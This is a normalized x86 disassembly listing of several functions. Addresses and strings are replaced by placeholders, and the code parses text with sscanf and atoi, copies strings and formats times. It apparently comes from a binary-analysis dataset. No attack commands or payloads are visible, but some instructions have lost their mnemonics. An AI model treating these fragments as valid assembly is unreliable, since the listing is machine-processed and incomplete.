mov [ ebp - 0x12c ] eax
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x130 ] eax
mov eax [ ebp - 0x130 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x131 ] al
inc [ ebp - 0x130 ]
cmp [ ebp - 0x131 ] 0x0
jne r-xdata
mov edi [ ebp - 0x130 ]
mov esi [ ebp - 0x128 ]
mov eax [ ebp - 0x12c ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub_401f3c
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0xc ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_401eff
pop ecx
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0x6c ]
jl r-xdata
xor al al
jg r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x68 ]
jbe r-xdata
leave
retn
sub_401f7a
push ebp
mov ebp esp
sub esp 0xb4
push esi
push edi
mov [ ebp - 0x10 ] ecx
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] r--data
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x19 ] 0x0
je r-xdata
mov [ ebp - 0x7c ] r--data
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x80 ] eax
push r--data
push [ ebp + 0xc ]
call sub_401629
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x20 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x1a ] al
mov ecx [ ebp - 0x14 ]
cmp al [ ecx + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x88 ] eax
cmp [ ebp - 0x81 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
add [ ebp - 0x18 ] 0x2
add [ ebp - 0x14 ] 0x2
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
pop edi
pop esi
leave
retn 0xc
push r--data
push [ ebp + 0xc ]
call sub_401629
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x88 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x80 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x82 ] al
mov ecx [ ebp - 0x7c ]
cmp al [ ecx + 0x1 ]
jne r-xdata
mov eax [ ebp - 0x74 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x75 ] al
inc [ ebp - 0x74 ]
cmp [ ebp - 0x75 ] 0x0
jne r-xdata
mov edi [ ebp - 0x74 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov al [ eax ]
mov [ ebp - 0x2d ] al
inc [ ebp - 0x28 ]
cmp [ ebp - 0x2d ] 0x0
jne r-xdata
mov eax [ ebp - 0x28 ]
sub eax [ ebp - 0x2c ]
mov [ ebp - 0x34 ] eax
jne r-xdata
mov eax [ ebp - 0x18 ]
mov al [ eax ]
mov [ ebp - 0x19 ] al
mov ecx [ ebp - 0x14 ]
cmp al [ ecx ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0xb0 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x90 ] eax
mov eax [ ebp - 0x90 ]
inc eax
mov [ ebp - 0x94 ] eax
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x8c ] 0x0
jne r-xdata
add [ ebp - 0x80 ] 0x2
add [ ebp - 0x7c ] 0x2
cmp [ ebp - 0x82 ] 0x0
jne r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x4 ]
call sub_405bd3
movzx eax al
test eax eax
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0xb0 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xb1 ] al
inc [ ebp - 0xb0 ]
cmp [ ebp - 0xb1 ] 0x0
jne r-xdata
mov edi [ ebp - 0xb0 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x90 ]
mov al [ eax ]
mov [ ebp - 0x95 ] al
inc [ ebp - 0x90 ]
cmp [ ebp - 0x95 ] 0x0
jne r-xdata
mov eax [ ebp - 0x90 ]
sub eax [ ebp - 0x94 ]
mov [ ebp - 0x9c ] eax
jne r-xdata
mov eax [ ebp - 0x80 ]
mov al [ eax ]
mov [ ebp - 0x81 ] al
mov ecx [ ebp - 0x7c ]
cmp al [ ecx ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x38 ] eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x4 ]
call sub_404a23
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x6c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x6d ] al
inc [ ebp - 0x6c ]
cmp [ ebp - 0x6d ] 0x0
jne r-xdata
mov edi [ ebp - 0x6c ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor al al
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x39 ] al
inc [ ebp - 0x38 ]
cmp [ ebp - 0x39 ] 0x0
jne r-xdata
mov edi [ ebp - 0x38 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0xa0 ] eax
mov eax [ ebp - 0x40 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x41 ] al
inc [ ebp - 0x40 ]
cmp [ ebp - 0x41 ] 0x0
jne r-xdata
mov edi [ ebp - 0x40 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0xa8 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xa9 ] al
inc [ ebp - 0xa8 ]
cmp [ ebp - 0xa9 ] 0x0
jne r-xdata
mov edi [ ebp - 0xa8 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor al al
jmp r-xdata
mov eax [ ebp - 0xa0 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xa1 ] al
inc [ ebp - 0xa0 ]
cmp [ ebp - 0xa1 ] 0x0
jne r-xdata
mov edi [ ebp - 0xa0 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x48 ]
mov al [ eax ]
mov [ ebp - 0x4d ] al
inc [ ebp - 0x48 ]
cmp [ ebp - 0x4d ] 0x0
jne r-xdata
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x4c ]
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x5c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x5d ] al
inc [ ebp - 0x5c ]
cmp [ ebp - 0x5d ] 0x0
jne r-xdata
mov edi [ ebp - 0x5c ]
mov esi [ ebp - 0x54 ]
mov eax [ ebp - 0x58 ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x64 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x65 ] al
inc [ ebp - 0x64 ]
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
mov edi [ ebp - 0x64 ]
mov esi r--data
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov al 0x1
jmp r-xdata
sub_40235f
push ebp
mov ebp esp
mov eax 0x2260
call sub_409800
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x1c ] eax
push esi
push edi
mov [ ebp - 0x20d0 ] ecx
mov eax [ ebp - 0x20d0 ]
movzx eax [ eax + 0x54 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20f8 ] eax
mov eax [ ebp - 0x20f8 ]
mov [ ebp - 0x20fc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20d4 ] eax
mov eax [ ebp - 0x20d4 ]
mov [ ebp - 0x20d8 ] eax
mov eax [ ebp - 0x20f8 ]
mov al [ eax ]
mov [ ebp - 0x20fd ] al
inc [ ebp - 0x20f8 ]
cmp [ ebp - 0x20fd ] 0x0
jne r-xdata
mov eax [ ebp - 0x20f8 ]
sub eax [ ebp - 0x20fc ]
mov ecx [ ebp - 0x20fc ]
mov [ ebp - 0x2104 ] ecx
mov [ ebp - 0x2108 ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x210c ] eax
mov eax [ ebp - 0x20d4 ]
mov al [ eax ]
mov [ ebp - 0x20d9 ] al
inc [ ebp - 0x20d4 ]
cmp [ ebp - 0x20d9 ] 0x0
jne r-xdata
mov eax [ ebp - 0x20d4 ]
sub eax [ ebp - 0x20d8 ]
mov ecx [ ebp - 0x20d8 ]
mov [ ebp - 0x20e0 ] ecx
mov [ ebp - 0x20e4 ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x20e8 ] eax
mov eax [ ebp - 0x210c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x210d ] al
inc [ ebp - 0x210c ]
cmp [ ebp - 0x210d ] 0x0
jne r-xdata
mov edi [ ebp - 0x210c ]
mov esi [ ebp - 0x2104 ]
mov eax [ ebp - 0x2108 ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x2114 ] eax
mov eax [ ebp - 0x20e8 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x20e9 ] al
inc [ ebp - 0x20e8 ]
cmp [ ebp - 0x20e9 ] 0x0
jne r-xdata
mov edi [ ebp - 0x20e8 ]
mov esi [ ebp - 0x20e0 ]
mov eax [ ebp - 0x20e4 ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x20f0 ] eax
mov eax [ ebp - 0x2114 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x2115 ] al
inc [ ebp - 0x2114 ]
cmp [ ebp - 0x2115 ] 0x0
jne r-xdata
mov edi [ ebp - 0x2114 ]
mov esi r--data
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x20c4 ] eax
mov eax [ ebp - 0x20c4 ]
mov [ ebp - 0x10 ] eax
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x20c8 ] eax
mov eax [ ebp - 0x20c8 ]
mov [ ebp - 0x8 ] eax
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x20cc ] eax
mov eax [ ebp - 0x20cc ]
mov [ ebp - 0xc ] eax
push 0x104
push 0x0
push [ ebp - 0x10 ]
call memset
add esp 0xc
push 0x104
push 0x0
push [ ebp - 0x8 ]
call memset
add esp 0xc
push 0x104
push 0x0
push [ ebp - 0xc ]
call memset
add esp 0xc
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebp - 0x20f0 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x20f1 ] al
inc [ ebp - 0x20f0 ]
cmp [ ebp - 0x20f1 ] 0x0
jne r-xdata
mov edi [ ebp - 0x20f0 ]
mov esi r--data
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x58 ] 0x1
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x5c ] 0x3e8
jmp r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x58 ] 0x0
jmp r-xdata
mov al 0x1
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
cmp eax [ ebp + 0x8 ]
jne r-xdata
lea ecx [ ebp - 0x2028 ]
call sub_40675a
mov [ ebp - 0x2020 ] 0x0
push 0x1fff
push 0x0
lea eax [ ebp - 0x201f ]
push eax
call memset
add esp 0xc
lea ecx [ ebp - 0x2028 ]
call sub_406b25
lea eax [ ebp - 0x2020 ]
push eax
lea ecx [ ebp - 0x2028 ]
call sub_4067ff
lea eax [ ebp - 0x2020 ]
mov [ ebp - 0x211c ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x2120 ] eax
mov eax [ ebp - 0x2120 ]
mov [ ebp - 0x2124 ] eax
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
cmp eax [ ebp + 0x8 ]
jne r-xdata
and [ ebp - 0x202c ] 0x0
push [ ebp - 0x10 ]
push [ ebp - 0x10 ]
push r--data
push [ ebp + 0x8 ]
call sscanf
add esp 0x10
push [ ebp - 0x10 ]
call atoi
pop ecx
mov [ ebp - 0x202c ] eax
cmp [ ebp - 0x202c ] 0x0
je r-xdata
mov eax [ ebp - 0x211c ]
mov al [ eax ]
mov [ ebp - 0x2125 ] al
mov eax [ ebp - 0x2120 ]
mov cl [ ebp - 0x2125 ]
mov [ eax ] cl
mov eax [ ebp - 0x211c ]
inc eax
mov [ ebp - 0x211c ] eax
mov eax [ ebp - 0x2120 ]
inc eax
mov [ ebp - 0x2120 ] eax
cmp [ ebp - 0x2125 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x2028 ]
call sub_406773
jmp r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
cmp eax [ ebp + 0x8 ]
jne r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x10 ]
push [ ebp - 0x10 ]
push r--data
push [ ebp + 0x8 ]
call sscanf
add esp 0x14
push [ ebp - 0x8 ]
push [ ebp - 0x10 ]
push r--data
mov ecx [ ebp - 0x20d0 ]
call sub_401f7a
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x2034 ]
call sub_40675a
lea ecx [ ebp - 0x2034 ]
call sub_406b25
push [ ebp - 0x202c ]
lea ecx [ ebp - 0x2034 ]
call sub_406d67
test eax eax
je r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
cmp eax [ ebp + 0x8 ]
jne r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x10 ]
push [ ebp - 0x10 ]
push r--data
push [ ebp + 0x8 ]
call sscanf
add esp 0x14
push [ ebp - 0x8 ]
push [ ebp - 0x10 ]
push r--data
mov ecx [ ebp - 0x20d0 ]
call sub_401f7a
jmp r-xdata
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x213c ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x212c ] eax
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
cmp eax [ ebp + 0x8 ]
jne r-xdata
xor eax eax
inc eax
shl eax 0x2
add eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
push [ ebp - 0x8 ]
push [ ebp - 0x10 ]
push [ ebp - 0x10 ]
push r--data
push [ ebp + 0x8 ]
call sscanf
add esp 0x14
push r--data
push [ ebp - 0x18 ]
call sub_401629
pop ecx
pop ecx
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x213c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x213d ] al
inc [ ebp - 0x213c ]
cmp [ ebp - 0x213d ] 0x0
jne r-xdata
mov edi [ ebp - 0x213c ]
push 0x5
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x2144 ] eax
mov eax [ ebp - 0x212c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x212d ] al
inc [ ebp - 0x212c ]
cmp [ ebp - 0x212d ] 0x0
jne r-xdata
mov edi [ ebp - 0x212c ]
push 0x6
pop ecx
mov esi r--data
[ edi ] [ esi ]
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x2134 ] eax
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
cmp eax [ ebp + 0x8 ]
jne r-xdata
xor eax eax
inc eax
imul eax eax 0xa
add eax [ ebp + 0x8 ]
push eax
call atoi
pop ecx
mov ecx [ ebp - 0x20d0 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0x5c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x2194 ] eax
mov eax [ ebp - 0x2194 ]
mov [ ebp - 0x2198 ] eax
push [ ebp - 0x18 ]
mov ecx [ ebp - 0x20d0 ]
call sub_40108f
movzx eax al
test eax eax
je r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x2144 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x2145 ] al
inc [ ebp - 0x2144 ]
cmp [ ebp - 0x2145 ] 0x0
jne r-xdata
mov edi [ ebp - 0x2144 ]
push 0x5
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov eax [ ebp - 0x2134 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x2135 ] al
inc [ ebp - 0x2134 ]
cmp [ ebp - 0x2135 ] 0x0
jne r-xdata
mov edi [ ebp - 0x2134 ]
push 0x6
pop ecx
mov esi r--data
[ edi ] [ esi ]
jmp r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
cmp eax [ ebp + 0x8 ]
jne r-xdata
xor eax eax
inc eax
imul eax eax 0xd
add eax [ ebp + 0x8 ]
push eax
call atoi
pop ecx
mov ecx [ ebp - 0x20d0 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0x60 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x21cc ] eax
mov eax [ ebp - 0x21cc ]
mov [ ebp - 0x21d0 ] eax
mov eax [ ebp - 0x2194 ]
mov al [ eax ]
mov [ ebp - 0x2199 ] al
inc [ ebp - 0x2194 ]
cmp [ ebp - 0x2199 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2194 ]
sub eax [ ebp - 0x2198 ]
mov ecx [ ebp - 0x2198 ]
mov [ ebp - 0x21a0 ] ecx
mov [ ebp - 0x21a4 ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x21a8 ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x2184 ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x217c ] eax
push [ ebp - 0x8 ]
push [ ebp - 0x10 ]
push r--data
mov ecx [ ebp - 0x20d0 ]
call sub_401f7a
movzx eax al
test eax eax
je r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x10 ]
push r--data
mov ecx [ ebp - 0x20d0 ]
call sub_401f7a
movzx eax al
test eax eax
je r-xdata
lea ecx [ ebp - 0x2034 ]
call sub_406773
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x20d0 ]
call sub_40108f
movzx eax al
test eax eax
je r-xdata
xor eax eax
inc eax
imul eax eax 0x6
add eax [ ebp + 0x8 ]
push eax
call atof
pop ecx
fmul [ r--data ]
fmul [ r--data ]
call sub_409866
mov ecx [ ebp - 0x20d0 ]
mov [ ecx + 0x5c ] eax
lea eax [ ebp - 0x2090 ]
push eax
call sub_401eff
pop ecx
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x5c ]
xor edx edx
mov ecx 0x3e8
div ecx
xor ecx ecx
add eax [ ebp - 0x2090 ]
mov edx [ ebp - 0x208c ]
adc edx ecx
mov ecx [ ebp - 0x20d0 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0x68 ] eax
mov [ ecx + 0x6c ] edx
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0x68 ]
mov [ ebp - 0x20c0 ] ecx
mov eax [ eax + 0x6c ]
mov [ ebp - 0x20bc ] eax
lea eax [ ebp - 0x20c0 ]
push eax
lea eax [ ebp - 0x20b4 ]
push eax
call _localtime64_s
pop ecx
pop ecx
lea eax [ ebp - 0x20b4 ]
push eax
push 0x50
lea eax [ ebp - 0x2088 ]
push eax
call asctime_s
add esp 0xc
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x2204 ] eax
mov eax [ ebp - 0x21cc ]
mov al [ eax ]
mov [ ebp - 0x21d1 ] al
inc [ ebp - 0x21cc ]
cmp [ ebp - 0x21d1 ] 0x0
jne r-xdata
mov eax [ ebp - 0x21cc ]
sub eax [ ebp - 0x21d0 ]
mov ecx [ ebp - 0x21d0 ]
mov [ ebp - 0x21d8 ] ecx
mov [ ebp - 0x21dc ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x21e0 ] eax
mov eax [ ebp - 0x21a8 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x21a9 ] al
inc [ ebp - 0x21a8 ]
cmp [ ebp - 0x21a9 ] 0x0
jne r-xdata
mov edi [ ebp - 0x21a8 ]
mov esi [ ebp - 0x21a0 ]
mov eax [ ebp - 0x21a4 ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x21b0 ] eax
mov eax [ ebp - 0x21b0 ]
mov [ ebp - 0x21b4 ] eax
mov eax [ ebp - 0x2184 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x2185 ] al
inc [ ebp - 0x2184 ]
cmp [ ebp - 0x2185 ] 0x0
jne r-xdata
mov edi [ ebp - 0x2184 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x218c ] eax
mov eax [ ebp - 0x217c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x217d ] al
inc [ ebp - 0x217c ]
cmp [ ebp - 0x217d ] 0x0
jne r-xdata
mov edi [ ebp - 0x217c ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov al 0x1
jmp r-xdata
jmp r-xdata
push [ ebp - 0x8 ]
mov ecx [ ebp - 0x20d0 ]
call sub_40108f
movzx eax al
test eax eax
je r-xdata
jmp r-xdata
push [ ebp - 0x8 ]
mov ecx [ ebp - 0x20d0 ]
call sub_40108f
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x2254 ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x224c ] eax
mov eax [ ebp - 0x2204 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x2205 ] al
inc [ ebp - 0x2204 ]
cmp [ ebp - 0x2205 ] 0x0
jne r-xdata
mov edi [ ebp - 0x2204 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2088 ]
mov [ ebp - 0x220c ] eax
mov eax [ ebp - 0x220c ]
mov [ ebp - 0x2210 ] eax
mov eax [ ebp - 0x21e0 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x21e1 ] al
inc [ ebp - 0x21e0 ]
cmp [ ebp - 0x21e1 ] 0x0
jne r-xdata
mov edi [ ebp - 0x21e0 ]
mov esi [ ebp - 0x21d8 ]
mov eax [ ebp - 0x21dc ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x21e8 ] eax
mov eax [ ebp - 0x21e8 ]
mov [ ebp - 0x21ec ] eax
mov eax [ ebp - 0x21b0 ]
mov al [ eax ]
mov [ ebp - 0x21b5 ] al
inc [ ebp - 0x21b0 ]
cmp [ ebp - 0x21b5 ] 0x0
jne r-xdata
mov eax [ ebp - 0x21b0 ]
sub eax [ ebp - 0x21b4 ]
mov ecx [ ebp - 0x21b4 ]
mov [ ebp - 0x21bc ] ecx
mov [ ebp - 0x21c0 ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x21c4 ] eax
mov eax [ ebp - 0x218c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x218d ] al
inc [ ebp - 0x218c ]
cmp [ ebp - 0x218d ] 0x0
jne r-xdata
mov edi [ ebp - 0x218c ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor al al
jmp r-xdata
pop edi
pop esi
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_4097f0
leave
retn 0x4
jmp r-xdata
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x216c ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x2164 ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x2154 ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x214c ] eax
mov eax [ ebp - 0x2254 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x2255 ] al
inc [ ebp - 0x2254 ]
cmp [ ebp - 0x2255 ] 0x0
jne r-xdata
mov edi [ ebp - 0x2254 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x225c ] eax
mov eax [ ebp - 0x224c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x224d ] al
inc [ ebp - 0x224c ]
cmp [ ebp - 0x224d ] 0x0
jne r-xdata
mov edi [ ebp - 0x224c ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov al 0x1
jmp r-xdata
